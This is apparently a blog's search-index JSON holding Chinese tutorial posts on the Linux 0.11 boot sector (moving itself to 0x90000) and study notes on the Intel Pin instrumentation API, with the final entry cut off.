[{"categories":["LINUX"],"content":"闪客Linux操作系统系列第二篇","date":"2021-11-21","objectID":"/linux-0.11-02-%E8%87%AA%E5%B7%B1%E7%BB%99%E8%87%AA%E5%B7%B1%E6%8C%AA%E4%B8%AA%E5%9C%B0%E5%84%BF/","tags":["Linux","kernel"],"title":"Linux-0.11-02-自己给自己挪个地儿","uri":"/linux-0.11-02-%E8%87%AA%E5%B7%B1%E7%BB%99%E8%87%AA%E5%B7%B1%E6%8C%AA%E4%B8%AA%E5%9C%B0%E5%84%BF/"},{"categories":["LINUX"],"content":"本文是Linux 0.11系列学习记录的第二篇。 02 自己给自己挪个地儿 书接上回，上回书咱们说到，CPU 执行操作系统的最开始的两行代码。 mov ax,0x07c0 mov ds,ax 将数据段寄存器 ds 的值变成了 0x07c0，方便了之后访问内存时利用这个段基址进行寻址。 接下来我们带着这两行代码，继续往下看几行。 mov ax,0x07c0 mov ds,ax mov ax,0x9000 mov es,ax mov cx,#256 sub si,si sub di,di rep movw 此时 ds 寄存器的值已经是 0x07c0 了，然后又通过同样的方式将 es 寄存器的值变成 0x9000，接着又把 cx 寄存器的值变成 256（代码里确实是用十进制表示的，与其他地方有些不一致，不过无所谓）。 再往下看有两个 sub 指令，这个 sub 指令很简单，比如 sub a,b 就表示 a = a - b 那么代码中的 sub si,si 就表示 si = si - si 所以如果 sub 后面的两个寄存器一模一样，就相当于把这个寄存器里的值清零，这是一个基本玩法。 那就非常简单了，经过这些指令后，以下几个寄存器分别被附上了指定的值，我们梳理一下。 ds = 0x07c0 es = 0x9000 cx = 256 si = 0 di = 0 还记得上一讲画的 CPU 寄存器的总图么？此时就是这样了 干嘛要给这些毫不相干的寄存器附上值呢？其实就是为下一条指令服务的，就是 rep movw 其中 rep 表示重复执行后面的指令。 而后面的指令 movw 表示复制一个字（word 16位），那其实就是不断重复地复制一个字。 那下面自然就有三连问： 重复执行多少次呢是 cx 寄存器中的值，也就是 256 次。 从哪复制到哪呢是从 ds:si 处复制到 es:di 处。 一次复制多少呢刚刚说过了，复制一个字，16 位，也就是两个字节。 上面是直译，那把这段话翻译成更人话的方式讲出来就是，将内存地址 0x7c00 处开始往后的 512 字节的数据，原封不动复制到 0x90000 处。 就是下图的第二步。 没错，就是这么折腾了一下。现在，操作系统最开头的代码，已经被挪到了 0x90000 这个位置了。 再往后是一个跳转指令。 jmpi go,0x9000 go: mov ax,cs mov ds,ax 仔细想想或许你能猜到它想干嘛。 jmpi 是一个段间跳转指令，表示跳转到 0x9000:go 处执行。 还记得上一讲说的 段基址 : 偏移地址 这种格式的内存地址要如何计算吧？段基址仍然要先左移四位，因此结论就是跳转到 0x90000 + go 这个内存地址处执行。忘记的赶紧回去看看，这才过了一回哦，要稳扎稳打。 再说 go，go 就是一个标签，最终编译成机器码的时候会被翻译成一个值，这个值就是 go 这个标签在文件内的偏移地址。 这个偏移地址再加上 0x90000，就刚好是 go 标签后面那段代码 mov ax,cs 此时所在的内存地址了。 那假如 mov ax,cx 这行代码位于最终编译好后的二进制文件的 0x08 处，那 go 就等于 0x08，而最终 CPU 跳转到的地址就是 0x90008 处。 所以到此为止，前两回的内容，其实就是一段 512 字节的代码和数据，从硬盘的启动区先是被移动到了内存 0x7c00 处，然后又立刻被移动到 0x90000 处，并且跳转到此处往后再稍稍偏移 go 这个标签所代表的偏移地址处，也就是 mov ax,cs 这行指令的位置。 仍然是保持每回的简洁，本文就讲到这里，希望大家还跟得上，接下来的下一回，我们就把目光定位到 go 标签处往后的代码，看看他又要折腾些什么吧。 后面的世界越来越精彩，欲知后事如何，且听下回分解。 ——- 本回扩展与延伸 ——- 有关寄存器的详细信息，可以参考 Intel 手册： Volume 1 Chapter 3.2 OVERVIEW OF THE BASIC EXECUTION ENVIRONMEN 如果想了解汇编指令的信息，可以参考 Intel 手册： Volume 2 Chapter 3 ~ Chapter 5 比如本文出现的 sub 指令，你完全没必要去百度它的用法，直接看手册。 Intel 手册对于理解底层知识非常直接有效，但却没有很好的中文翻译版本，因此让许多人望而生畏，只能去看一些错误百出的中文二手资料和博客。因此我也发起了一个 Intel 手册翻译计划，就在阅读原文的 GitHub 里，感兴趣的同胞们可以参与进来，我们共同完成一份伟大的事。 希望你跟完整个系列，收获的不仅仅是 Linux 0.11 源码的了解，更是自己探索问题和寻找答案的一个科学思考方式。 所以每次本回扩展与延伸这里，希望你也能每天进步一点点，实践起来，再不济，也能多学几个英语单词不是？ ","date":"2021-11-21","objectID":"/linux-0.11-02-%E8%87%AA%E5%B7%B1%E7%BB%99%E8%87%AA%E5%B7%B1%E6%8C%AA%E4%B8%AA%E5%9C%B0%E5%84%BF/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-02-自己给自己挪个地儿","uri":"/linux-0.11-02-%E8%87%AA%E5%B7%B1%E7%BB%99%E8%87%AA%E5%B7%B1%E6%8C%AA%E4%B8%AA%E5%9C%B0%E5%84%BF/"},{"categories":["LINUX"],"content":"原文地址 闪客新系列！你管这破玩意叫操作系统源码 ","date":"2021-11-21","objectID":"/linux-0.11-02-%E8%87%AA%E5%B7%B1%E7%BB%99%E8%87%AA%E5%B7%B1%E6%8C%AA%E4%B8%AA%E5%9C%B0%E5%84%BF/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-02-自己给自己挪个地儿","uri":"/linux-0.11-02-%E8%87%AA%E5%B7%B1%E7%BB%99%E8%87%AA%E5%B7%B1%E6%8C%AA%E4%B8%AA%E5%9C%B0%E5%84%BF/"},{"categories":["LINUX"],"content":"闪客Linux操作系统系列第一篇","date":"2021-11-19","objectID":"/linux-0.11-01-%E6%9C%80%E5%BC%80%E5%A7%8B%E7%9A%84%E4%B8%A4%E8%A1%8C%E4%BB%A3%E7%A0%81/","tags":["Linux","kernel"],"title":"Linux-0.11-01-最开始的两行代码","uri":"/linux-0.11-01-%E6%9C%80%E5%BC%80%E5%A7%8B%E7%9A%84%E4%B8%A4%E8%A1%8C%E4%BB%A3%E7%A0%81/"},{"categories":["LINUX"],"content":"本文是Linux 0.11系列学习记录的正式的第一篇，主要是介绍下系统起来最开始的两行代码的作用。 ","date":"2021-11-19","objectID":"/linux-0.11-01-%E6%9C%80%E5%BC%80%E5%A7%8B%E7%9A%84%E4%B8%A4%E8%A1%8C%E4%BB%A3%E7%A0%81/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-01-最开始的两行代码","uri":"/linux-0.11-01-%E6%9C%80%E5%BC%80%E5%A7%8B%E7%9A%84%E4%B8%A4%E8%A1%8C%E4%BB%A3%E7%A0%81/"},{"categories":["LINUX"],"content":"前言 从这一篇开始，您就将跟着我一起进入这操作系统的梦幻之旅！ 别担心，每一章的内容会非常的少，而且你也不要抱着很大的负担去学习，只需要像读小说一样，跟着我一章一章读下去就好。 ","date":"2021-11-19","objectID":"/linux-0.11-01-%E6%9C%80%E5%BC%80%E5%A7%8B%E7%9A%84%E4%B8%A4%E8%A1%8C%E4%BB%A3%E7%A0%81/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-01-最开始的两行代码","uri":"/linux-0.11-01-%E6%9C%80%E5%BC%80%E5%A7%8B%E7%9A%84%E4%B8%A4%E8%A1%8C%E4%BB%A3%E7%A0%81/"},{"categories":["LINUX"],"content":"正文 当按下开机键的那一刻，在主板上提前写死的固件程序 BIOS 会将硬盘中启动区的 512 字节的数据，原封不动复制到内存中的 0x7c00 这个位置，并跳转到那个位置进行执行。 启动区的定义非常简单，只要硬盘中的 0 盘 0 道 1 扇区的 512 个字节的最后两个字节分别是 0x55 和 0xaa，那么 BIOS 就会认为它是个启动区。 所以对于我们理解操作系统而言，此时的 BIOS 仅仅就是个代码搬运工，把 512 字节的二进制数据从硬盘搬运到了内存中而已。所以作为操作系统的开发人员，仅仅需要把操作系统最开始的那段代码，编译并存储在硬盘的 0 盘 0 道 1 扇区即可。之后 BIOS 会帮我们把它放到内存里，并且跳过去执行。 而 Linux-0.11 的最开始的代码，就是这个用汇编语言写的 bootsect.s，位于 boot 文件夹下。 通过编译，这个 bootsect.s 会被编译成二进制文件，存放在启动区的第一扇区。 随后就会如刚刚所说，由 BIOS 搬运到内存的 0x7c00 这个位置，而 CPU 也会从这个位置开始，不断往后一条一条语句无脑地执行下去。 那我们的梦幻之旅，就从这个文件的第一行代码开始啦！ mov ax,0x07c0 mov ds,ax 好吧，先连续看两行。 这段代码是用汇编语言写的，含义是把 0x07c0 这个值复制到 ax 寄存器里，再将 ax 寄存器里的值复制到 ds 寄存器。那其实这一番折腾的结果就是，让 ds 这个寄存器里的值变成了 0x07c0。 ds 是一个 16 位的段寄存器，具体表示数据段寄存器，在内存寻址时充当段基址的作用。啥意思呢？就是当我们之后用汇编语言写一个内存地址时，实际上仅仅是写了偏移地址，比如： mov ax, [0x0001] 实际上相当于 mov ax, [ds:0x0001] ds 是默认加上的，表示在 ds 这个段基址处，往后再偏移 0x0001 单位，将这个位置的内存数据，复制到 ax 寄存器中。 形象地比喻一下就是，你和朋友商量去哪玩比较好，你说天安门、南锣鼓巷、颐和园等等，实际上都是偏移地址，省略了北京市这个基址。 当然你完全可以说北京天安门、北京南锣鼓巷这样，每次都加上北京这个前缀。不过如果你事先和朋友说好，以下我说的地方都是北京市里的哈，之后你就不用每次都带着北京市这个词了，是不是很方便？ 那 ds 这个数据段寄存器的作用就是如此，方便了描述一个内存地址时，可以省略一个基址，没什么神奇之处。 ds : 0x0001 北京市 : 南锣鼓巷 再看，这个 ds 被赋值为了 0x07c0，由于 x86 为了让自己在 16 位这个实模式下能访问到 20 位的地址线这个历史因素（不了解这个的就先别纠结为啥了），所以段基址要先左移四位。那 0x07c0 左移四位就是 0x7c00，那这就刚好和这段代码被 BIOS 加载到的内存地址 0x7c00 一样了。 也就是说，之后再写的代码，里面访问的数据的内存地址，都先默认加上 0x7c00，再去内存中寻址。 为啥统一加上 0x7c00 这个数呢？这很好解释，BIOS 规定死了把操作系统代码加载到内存 0x7c00，那么里面的各种数据自然就全都被偏移了这么多，所以把数据段寄存器 ds 设置为这个值，方便了以后通过这种基址的方式访问内存里的数据。 OK，赶紧消化掉前面的知识，那本篇就到此为止，只讲了两行代码，知识量很少，我没骗你吧。 希望你能做到，对 BIOS 将操作系统代码加载到内存 0x7c00，以及我们通过 mov 指令将默认的数据段寄存器 ds 寄存器的值改为 0x07c0 方便以后的基址寻址方式，这两件事在心里认可，并且没有疑惑，这才方便后面继续进行。 后面的世界越来越精彩，欲知后事如何，且听下回分解。 ——- 本回扩展资料 ——- 有关寄存器的详细信息，可以参考 Intel 手册： Volume 1 Chapter 3.2 OVERVIEW OF THE BASIC EXECUTION ENVIRONMEN 有关计算机启动部分的原理如果还不清楚，可以看我之前的一篇文章了解一下： 计算机的启动过程 如果想了解计算机启动时详细的初始化过程，还是得参考 Intel 手册： Volume 3A Chapter 9 PROCESSOR MANAGEMENT AND INITIALIZATION ","date":"2021-11-19","objectID":"/linux-0.11-01-%E6%9C%80%E5%BC%80%E5%A7%8B%E7%9A%84%E4%B8%A4%E8%A1%8C%E4%BB%A3%E7%A0%81/:2:0","tags":["Linux","kernel"],"title":"Linux-0.11-01-最开始的两行代码","uri":"/linux-0.11-01-%E6%9C%80%E5%BC%80%E5%A7%8B%E7%9A%84%E4%B8%A4%E8%A1%8C%E4%BB%A3%E7%A0%81/"},{"categories":["LINUX"],"content":"原文地址 闪客新系列！你管这破玩意叫操作系统源码 ","date":"2021-11-19","objectID":"/linux-0.11-01-%E6%9C%80%E5%BC%80%E5%A7%8B%E7%9A%84%E4%B8%A4%E8%A1%8C%E4%BB%A3%E7%A0%81/:3:0","tags":["Linux","kernel"],"title":"Linux-0.11-01-最开始的两行代码","uri":"/linux-0.11-01-%E6%9C%80%E5%BC%80%E5%A7%8B%E7%9A%84%E4%B8%A4%E8%A1%8C%E4%BB%A3%E7%A0%81/"},{"categories":["LINUX"],"content":"闪客Linux操作系统系列序言","date":"2021-11-18","objectID":"/linux-0.11-%E5%BA%8F/","tags":["Linux","kernel"],"title":"Linux-0.11-序","uri":"/linux-0.11-%E5%BA%8F/"},{"categories":["LINUX"],"content":"本文是Linux 0.11系列学习记录的序言篇，主要是闪客在微信公众号上发布的相关内容的整理总结。 ","date":"2021-11-18","objectID":"/linux-0.11-%E5%BA%8F/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-序","uri":"/linux-0.11-%E5%BA%8F/"},{"categories":["LINUX"],"content":"前言 本系列是闪客sun的最新微信公众号技术文章系列–《你管这破玩意叫操作系统源码》。闪客sun的文章基本全是干货，懂的都懂，这次的新系列实在是掐中了很多人的痛点，能很好地帮助大家深入理解 Linux 操作系统。 本着学习和分享的目的，blog 会进行该系列文章的同步更新，希望能有更多想学习技术干货的人了解到闪客sun和他的技术文。在每篇文章的末尾，会放上公众号链接，希望大家在学习的同时，也多多支持闪客sun。 公众号 低并发编程： 以下为原文： 写在前面 核心信息提炼到开头，以节约大家的时间。 要干嘛：写一个系列 啥目的：带大家把 Linux 0.11 核心代码与操作系统的设计思想啃下来 叫啥名：你管这破玩意叫操作系统源码 — 像小说一样品读 Linux 0.11 核心代码 发文时间：每周一和每周四 预计章节：60 回 互动方式：微信群（文末有加入方式） 系列整体布局： 第一部分：进入内核前的苦力活 第二部分：大战前期的初始化工作 第三部分：一个新进程的诞生 第四部分：shell 程序的到来 第五部分：从一个命令的执行看操作系统各模块的运作 第六部分：操作系统哲学与思想 OK，以上就是要说的重要的事，以下是啰嗦的部分。 我是分割线 每个程序员都有一个操作系统梦，而操作系统也是每个程序员的心结。 很粗糙地了解一点操作系统知识，一知半解的，已经无法满足当下程序员的口味了。但要说深入剖析操作系统，又是大部分程序员都很惶恐的一件事。那如果是要读一遍操作系统源码，那简直跟要了命一样。 其实，操作系统的源码并没有那么可怕，可为什么即便是 Linux 0.11 这种代码量最少的版本，仍然令很多人望而却步呢？ 为什么望而却步 其实，很多优秀的操作系统书籍都是以 Linux 0.11 这个经典版本为研究对象进行讲解的，比如《Linux 内核设计的艺术》、 《Linux 内核完全注释》等。但我们想一下，当我们读一本小说时，为什么即便是非常大部头的小说，也能酣畅淋漓从头读到尾？ 先不直接回答这个问题，我们看一下**《天龙八部》**的最开头： “青光闪动，一柄青钢剑倏地刺出，指向中年汉子左肩，使剑少年不待剑招用老，腕抖剑斜，剑锋已削向那汉子右颈。那中年汉子…” 记住这个感觉没？我们再看一下《Linux 内核设计的艺术》的最开头： “对于操作系统而言，稳定且可靠地运行是最重要的。现行技术方案是将用户进程与用户进程之间、用户进程与操作系统之间进行分离，操作系统可以管理用户进程，但是用户进程之间不能相互干预 …” 好了，不用读下去了，这句话看似高瞻远瞩地从宏观上帮我们梳理操作系统体系结构，但对于尚不了解操作系统的人来说，完全不知道它在说什么，只有劝退的作用。 虽然说思想很重要，但你在没有任何细节做积累时去强行进行思想的拔高，是拔不上去的，还不如一直保持一张白纸的状态。 反观《天龙八部》的开头，连人物的名字都没有，更别说梳理整个体系结构了，直接上来一个精彩镜头，让你迅速进入故事情节。 可是读完整部小说的读者，无一不对里面的人物如数家珍，对大理的风光仿佛亲眼看见了一般，对宋辽矛盾的激烈感同身受。 为什么会这样呢？因为一切的爱恨情仇和民族矛盾，都是我们通过一个个人物和事件的刻画，感悟出来的。只有自己感悟出来的知识和靠自己总结出来的结论，才真正属于自己。 而那些一上来就试图把整个脉络给你梳理清楚的尝试，对于新手来说无一不是徒劳，即便是死记硬背记住了，也终究不是属于自己的知识，无法感同身受。 我学习操作系统的过程中，也有这样的感觉。 我曾一次次试图从一个上帝视角来看操作系统的知识体系，从宏观层面跟着大部头书籍梳理操作系统的整体逻辑，我发现无一不是以失败告终。 而当我放下包袱，用读一本小说的心态来去阅读 Linux 源代码时，我发现，我从来没有去想着梳理出什么体系，但不知道从哪一行代码开始，整个操作系统的体系结构已经较为清晰地出现在我面前了，竟是那么的不知不觉。 而且我也清晰地知道，这样的体系是怎么一步步从第一行代码开始，逐步建立起来的。 虽然我还没有触类旁通，真正理解操作系统的哲学与设计思想，也不能凭自己的想法写出一个新的操作系统来，但最初的这道坎我算是过去了。 所以我想把这些梳理一下，分享给大家。同时也能更好地让自己巩固细节，最终真正理解操作系统的思想，达到触类旁通。 如何分享呢？ 打算写个新系列 我并不是说《Linux 内核设计的艺术》这本书不好，而是想着能不能也以写小说一样的心态和方式，来给大家从头到尾讲述这部 Linux 0.11 的源码。 我打算把这个系列叫做 《你管这破玩意叫操作系统源码 —— 像小说一样品读 Linux 0.11 核心代码》 在这里面，我不会经常把操作系统的体系架构挂在嘴边，时时刻刻强行塞到你的脑子里，而是通过一行一行代码逐渐带入情节，最终让你不知不觉地发现，原来整个操作系统的体系就这样一点一点建立起来了。 本系列的每一章内容都很短，千万不要有心里负担，而正是这些简单的事情联系到一起，就构成了整个操作系统的复杂的设计。 所以也导致了，单独看任何一章都不会有显著的收获，但如果整个系列都能跟下来，并且每一章的内容都能做出思考，把不懂的地方及时解决，我保证你会对操作系统有一个全新的，深入到细节的认识。 希望你跟我走完这个系列，也能发出一句感叹，原来操作系统源码不过如此，就是这么个破玩意而已！ 但同时，你也要有耐心，你不要总想着，读到这了我怎么还是没觉得自己懂操作系统了呢？怎么还是没讲多进程如何调度呢？记住，享受当下，当下你学的每一个看似没啥用的知识，都是后面豁然开朗这种感觉的基石。 等等，我记得闪客之前也说要写个自制操作系统系列呢？不过好像… 万一中途又鸽了怎么办 话说回来，我的老读者有点惨，之前总是看我信誓旦旦说要写操作系统的系列，但无一例外都是中途失败了。 博客园上写过，公众号上也写过，而公众号里的好多读者就是被我的自制操作系统系列骗进来的，然后写到第五章我就鸽了，实在太过分了！ 所以接下来自然就有一个大家都关心的问题了，就是这次会不会又鸽呢？ 我可以肯定的是，这次绝对绝对绝对绝对绝对绝对不会中途鸽了！因为我此时此刻已经把全部的大纲以及文章的前 33 章的内容写好了，就藏在我的石墨文档里。后面的内容我打算根据前面的反馈和问答，不断做出调整。 没错，总共我计划分六大部分，前四部分你会看到从开机一直到操作系统的最后一行代码的全部主流程，第五部分将通过一个命令的执行将操作系统各个模块的运作方式串一遍，而第六部分会做一个思想的拔高，这也是我自己给自己挖的一个坑和挑战。 而六大部分对应到 Linux 0.11 源码从开机到 shell 的流程图，是这样的。 其实本可以早早就开始边写边发布，但想着要是这次中途又鸽了读者，着实有点不好意思。所以就冒着中途写不下去的风险，先把大部分文章提前写好。 但我也给自己留了个后路，就是只提前写了 33 章，也够大家看好几个月了，要是大家不捧场，我后面就不更了，哼（傲娇表情.gif）！ 提前写好有个好处，就是写到后面的时候，发现前面有些地方可以提前做个引子，这样整个系列就更完整了，可以前后呼应，可读性和收获也会大大增加。 如何互动 虽然已经提前写好，但中途还是要不断接受读者反馈和答疑，以便更好修正文章的内容，并且做一些知识点的补充，这也是我对自己的要求和考验。 所以建立微信群增加互动性。 在这里你可以不断对文章内容提出反馈意见，以及和不同读者进行心得交流，以及进行催更呐喊。不要觉得你的意见无法左右这个系列，要知道，这个系列的名称就是低并发编程读者群的读者们群体的智慧想出来的。 我觉得这也是公众号里更新系列的一个优势，就是与读者的距离更近，更方便随时讨论和交流，互相促进成长。 加入方式是加我微信好友，备注 os-昵称-其他信息 比如 os-闪客-Java 我会将所有备注为本格式的好友邀请至微信群。 一定要按备注要求来哦~ 我是华丽的分割线 好了！本篇文章就当做开篇词，今后不出意外至少每周一周四更新，每一个大部分结束后会看情况留一段时间集中消化与总结。 不过会以文章质量和准确性为主，不会带着问题强行按时更新的。 本系列完全免费，直到所有章节全部结束，所以你们的喜欢和传播就是对我最大的支持，可以星标我的公众号防止错过更新提醒。 公众号虽然与读者距离更近，但它却是个封闭的空间，平台和搜索引擎不会主动向外扩散，所以如果没有人主动帮忙传播，会一直限制在公众号粉丝的圈子里，越到后面看的人也会越少。 这也是很多公众号系列中途腰斩的因素之一，所以还是希望大家喜欢这个系列的话，可以多多帮忙传播，比如朋友圈打打卡，或者如果你也写博客的话，文章里提提我，都是可以帮到这个系列活下去的重要途径，在此多谢各位捧场啦！ 同时我也会在 GitHub 上进行同步，因为公众号文章发了之后就无法修改，也没法进行整体调整。感兴趣的也可以点击阅读原文进入 GitHub。但我同步应该不会很及时，还是以公众号为主战场，毕竟时间和精力有限。 那就让我们一起期待吧！ ","date":"2021-11-18","objectID":"/linux-0.11-%E5%BA%8F/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-序","uri":"/linux-0.11-%E5%BA%8F/"},{"categories":["LINUX"],"content":"原文地址","date":"2021-11-18","objectID":"/linux-0.11-%E5%BA%8F/:2:0","tags":["Linux","kernel"],"title":"Linux-0.11-序","uri":"/linux-0.11-%E5%BA%8F/"},{"categories":["Fuzz"],"content":"Pin学习记录第二篇","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"本文是Pin系列学习记录的第二篇，主要是官方文档的相关内容的整理总结。 ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:0:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"4. Callbacks 这部分主要介绍几个Pin的用于注册回调函数的API： INS_AddInstrumentFunction (INSCALLBACK fun, VOID *val)：注册以指令粒度插桩的函数 TRACE_AddInstrumentFunction (TRACECALLBACK fun, VOID *val)：注册以trace粒度插桩的函数 RTN_AddInstrumentFunction (RTNCALLBACK fun, VOID *val)：注册以routine粒度插桩的函数 IMG_AddInstrumentFunction (IMGCALLBACK fun, VOID *val)：注册以image粒度插桩的函数 PIN_AddFiniFunction (FINICALLBACK fun, VOID *val)：注册在应用程序退出前执行的函数，该类函数不进行插桩，可以有多个。 PIN_AddDetachFunction (DETACHCALLBACK fun, VOID *val)：注册在Pin通过PIN_Detach()函数放弃对应用程序的控制权限之前执行的函数，一个进程只调用一次，可以被任何线程调用，此时Pin的内存并没有释放。 对于每个注册函数的第二个参数val将在“回调”时传递给回调函数。如果在实际的场景中不需要传递第二个参数，为了保证安全，可以传递将val的值设置为0进行传递。val的理想使用方式是传递一个指向类实例的指针，这样回调函数在取消引用该指针前需要将其转换回一个对象。 所有的注册函数都会返回一个PIN_CALLBACK对象，该对象可以在后续过程中用于操作注册的回调的相关属性。 ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:1:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"PIN callbacks manipulation API 在注册函数返回PIN_CALLBACK对象后，可以使用PIN_CALLBACKAPI对其进行操作，来检索和修改在Pin中已注册的回调函数的属性。 声明： typedef COMPLEX_CALLBACKVAL_BASE * PIN_CALLBACK 函数： CALLBACK_GetExecutionOrder() 声明： VOID CALLBACK_GetExecutionOrder (PIN_CALLBACK callback) 作用：获取已注册回调函数的执行顺序。越靠前，越早被执行。 参数：callback，从*_Add*Funcxtion()函数返回的注册的回调函数 CALLBACK_SetExecutionOrder() 声明： VOID CALLBACK_SetExecutionOrder (PIN_CALLBACK callback, CALL_ORDER order) 作用：设置已注册回调函数的执行顺序。越靠前，越早被执行。 参数：callback，从*_Add*Funcxtion()函数返回的注册的回调函数；order，新设置的回调函数的执行顺序。 PIN_CALLBACK_INVALID() 声明： const PIN_CALLBACK PIN_CALLBACK_INVALID(0) PIN回调的无效值。 ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:1:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"CALL_ORDER CALL_ORDER是一个枚举类型，预定义了IARG_CALL_ORDER的值。其作用就是当指令有多个分析函数调用时，控制每个分析函数的调用顺序，默认值为CALL_ORDER_DEFAULT。 CALL_ORDER_FIRST：首先执行该调用，整数值为100. CALL_ORDER_DEFAULT：未指定IARG_CALL_ORDER时的默认值，整数值为200. CALL_ORDER_LAST：最后执行该调用，整数值为300. 在进行数值设定时，可以使用类似CALL_ORDER_DEFAULT + 5的格式来设置。 针对在相同插桩回调环境中的针对同一指令的、具备同样CALL_ORDER的多个分析调用，Pin会按照插入的顺序进行调用。 ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:1:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"5. Mopdifying Application Instructions 虽然Pin的主要用途是对二进制程序进行插桩，但是它也可以实现对程序指令的修改。 ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:2:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"5.1 实现方式 最简单的实现方式是插入一个分析routine来模拟指令执行，然后调用INS_Delete()来删除指令。也可以通过直接或间接插入程序执行流分支（使用INS_InsertDirectJump和INS_InsertIndirectJump）实现，这种方式会改变程序的执行流，但是会更容易实现指令模拟。 INS_InsertDirectJump() 声明： VOID INS_InsertDirectJump(INS ins, IPOINT ipoint, ADDRINT tgt) 参数： ins：输入的指令 ipoint：与ins相关的location（仅支持IPOINT_BEFORE和IPOINT_AFTER） tgt：target的绝对地址 作用：插入相对于给定指令的直接跳转指令，与INS_Delete()配合使用可以模拟控制流转移指令。 INS_InsertIndirectJump() 声明： VOID INS_InsertIndirectJump ( INS ins, IPOINT ipoint, REG reg) 参数： ins：输入的指令 ipoint：与ins相关的location（仅支持IPOINT_BEFORE和IPOINT_AFTER reg：target的寄存器 作用：插入相对于给定指令的间接跳转指令，与INS_Delete()配合使用可以模拟控制流转移指令。 ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:2:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"5.2 指令内存修改 对于原始指令使用到的内存的访问，可以通过使用INS_RewriteMemoryOperand来引用通过分析routine计算得到的值来替代。 需要注意的是，对于指令的修改操作，会在所有的指令插桩操作完成后进行，因此在进行指令插桩时，插桩routine看到的都是原始的、没有经过修改的程序指令。 INS_RewriteMemoryOperand() 声明： VOID INS_RewriteMemoryOperand(INS ins, UINt32 memindex, REG newBase) 参数： ins：输入指令 memindex：控制需要重写的内存操作数（0，1，…） newBase：包含新操作数地址的寄存器，通常是通过PIN_ClainToolRegister分配的临时寄存器 作用：更改此内存访问指令以饮用包含在给定特定寄存器中的虚拟内存地址。 在IA-32和Intel 64平台上，修改后的操作数仅使用具有新基址寄存器newBase的基址寄存器进行寻址。原始指令中该操作数的任何index， scale或者offset filed都会被删除。 该函数可以用于重写内存操作数，包括隐式的（如call、ret、push、pop），唯一不能重写的指令是第二个操作数大于0的enter。 newBase中的地址是中是该操作数将访问的最低地址，如果操作数在内存访问之前被指令修改，如push，则newBase中的值将不是堆栈指针，而是指令访问的内存地址。 用于内存地址重写的一个样例插桩代码如下： // 映射originalEa到一个翻译后的地址 static ADDRINT ProcessAddress(ADDRINT originalEa, ADDRINT size, UINT32 access); ... for (UINT32 op = 0; op\u003cINS_MemoryOperandCount(ins); op++) // 首先遍历内存操作指令进行计数 { UINT32 access = (INS_MemoryOperandIsRead(ins,op) ? 1 : 0) | // 判断是内存读还是内存写 (INS_MemoryOperandIsWritten(ins,op) ? 2 : 0); INS_InsertCall(ins, IPOINT_BEFORE, AFUNPTR(ProcessAddress), IARG_MEMORYOP_EA, op, IARG_MEMORYOP_SIZE, op, IARG_UINT32, access, IARG_RETURN_REGS, REG_INST_G0+i, IARG_END); // 在指令处进行插桩 INS_RewriteMemoryOperand(ins, i, REG(REG_INST_G0+i)); // 重写内存指令的操作数 } ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:2:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"6. Applying a Pintool to an Application 命令行： pin [pin-option]... -t [toolname] [tool-options]... -- [application] [application-option].. ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:3:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 